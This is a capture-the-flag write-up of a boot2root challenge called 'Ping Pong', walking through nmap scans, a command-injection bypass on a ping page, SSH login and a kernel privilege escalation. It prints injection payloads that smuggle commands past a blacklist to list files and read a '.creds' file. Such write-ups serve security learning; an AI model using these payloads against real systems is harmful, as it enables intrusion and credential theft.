---
layout: default
title : muzec - THN B'Darija CTF Writeup
---

![image](https://user-images.githubusercontent.com/69868171/163996136-8eb23528-8405-4f79-8f8e-2647dd9f1929.png)

Welcome to the Moroccan national CTF competition write-ups hosted by Th3 Hacker News B'darija which is a fun one really great challanges and guess what we won me and my teammate `Aptx1337` .

![image](https://user-images.githubusercontent.com/69868171/163996754-40f5061e-8de2-419e-84df-dbd063d20ec1.png)

Now let get started already without wasting to much of time on it.

### Boot2Root Ping Pong

We always start with an nmap scan.....

```
nmap -p- --min-rate 10000 -oN nmap/allports -v IP
```

```
# Nmap 7.91 scan initiated Tue Apr 19 10:08:59 2022 as: nmap -p- --min-rate 10000 -oN nmap/allports.tcp -v 165.232.89.13
Increasing send delay for 165.232.89.13 from 0 to 5 due to 143 out of 476 dropped probes since last increase.
Increasing send delay for 165.232.89.13 from 40 to 80 due to 92 out of 305 dropped probes since last increase.
Increasing send delay for 165.232.89.13 from 80 to 160 due to 11 out of 11 dropped probes since last increase.
Increasing send delay for 165.232.89.13 from 160 to 320 due to 11 out of 11 dropped probes since last increase.
Increasing send delay for 165.232.89.13 from 320 to 640 due to 11 out of 11 dropped probes since last increase.
Increasing send delay for 165.232.89.13 from 640 to 1000 due to 11 out of 11 dropped probes since last increase.
Warning: 165.232.89.13 giving up on port because retransmission cap hit (10).
Nmap scan report for 165.232.89.13
Host is up (0.33s latency).
Not shown: 58856 filtered ports, 6675 closed ports
PORT    STATE SERVICE
22/tcp  open  ssh
25/tcp  open  smtp
80/tcp  open  http
587/tcp open  submission

Read data files from: /usr/bin/../share/nmap
# Nmap done at Tue Apr 19 10:14:28 2022 -- 1 IP address (1 host up) scanned in 329.15 seconds
```

Now let use some default nmap scripts and service detection on it to see what we have XD.

```
┌──(muzec㉿Muzec-Security)-[~/Desktop/CTFPlayground/thbctf/ping]
└─$ nmap -sC -sV -oN nmap/normal.tcp 165.232.89.13  -p22,80 
Starting Nmap 7.91 ( https://nmap.org ) at 2022-04-19 10:12 WAT
Nmap scan report for 165.232.89.13
Host is up (0.58s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Ubuntu 6ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 00:3f:c8:b2:5c:a0:4f:c0:3f:67:f4:9a:fe:ee:2b:ab (ECDSA)
|_  256 8c:df:3e:bf:e9:c7:f5:a6:5a:d9:cc:be:73:89:ab:3e (ED25519)
80/tcp open  http    Apache httpd 2.4.48 ((Ubuntu))
|_http-server-header: Apache/2.4.48 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 119.14 seconds
```

Now we know we have 2 open ports let check what we have running on the webserver.

![image](https://user-images.githubusercontent.com/69868171/164002000-cf2624d9-41fc-49e9-ad7d-e82908f62877.png)

That a simple installation page of apache webserver let confirm we have anything special on `index.php` .

![image](https://user-images.githubusercontent.com/69868171/164002350-263d8d47-5f0b-4193-be78-2d2027c6d40e.png)

Interesting a page which we can ping with it.

![image](https://user-images.githubusercontent.com/69868171/164002580-5efe828f-c462-47b4-92da-02f0182fd9a4.png)

Do we have anything special in the source code.

![image](https://user-images.githubusercontent.com/69868171/164002712-26fd41f8-9edc-4f2c-a81b-a20dd42b2e4b.png)

We are blacklist from running some `OS` command which can lead to command injection but not to worry let try some bypassing.

![image](https://user-images.githubusercontent.com/69868171/164003855-a2a568bd-3c58-47a3-bb97-cbd616460b11.png)

Now we have command injection let see what we can loot `credentials` `credentials` XD 

![image](https://user-images.githubusercontent.com/69868171/164006193-70db47ce-6484-4f45-8815-6e4ee94c83ef.png)

```
127.0.0.1;llss${IFS}-la
```

Now that is what am talking about `.creds` seems promising let see what we have in it.

![image](https://user-images.githubusercontent.com/69868171/164006653-15d48b6a-2330-4a70-b5f2-47559a7fbd88.png)

```
127.0.0.1;cacatt${IFS}.creds
```

Credentials seems encoder with help of cyberchef let decode it.

![image](https://user-images.githubusercontent.com/69868171/164007092-51bde298-a81c-4415-bf18-ef64d6b3a05d.png)


Now we have credentials let hit SSH.

![image](https://user-images.githubusercontent.com/69868171/164007462-7a5277cb-fc6a-4f3a-83e1-e9254ba1660d.png)

We are in time to get root checking for `sudo` and `SUID` i got nothing so let some kernal version exploit.

![image](https://user-images.githubusercontent.com/69868171/164008067-54c079cd-311e-4e46-884a-ab4528cac796.png)


Now let hit google for some research after trying some exploits with no success i got an exploit on github and decided to give it a try 

![image](https://user-images.githubusercontent.com/69868171/164011686-81f393ef-9d16-43a4-991f-07328e6c77b4.png)

Now let run our exploit.

![image](https://user-images.githubusercontent.com/69868171/164012344-39f017c8-d3cd-4846-ba7e-b4765652eecb.png)

Boom we are root and we have the `flag`. 

![image](https://user-images.githubusercontent.com/69868171/164013128-fa0cf565-af88-4b60-b473-620cef217c24.png)

```
thnb{p1nG_p0onG_g4m3_w4s_FuN_4kh4y_Sp1p47_696969}
```
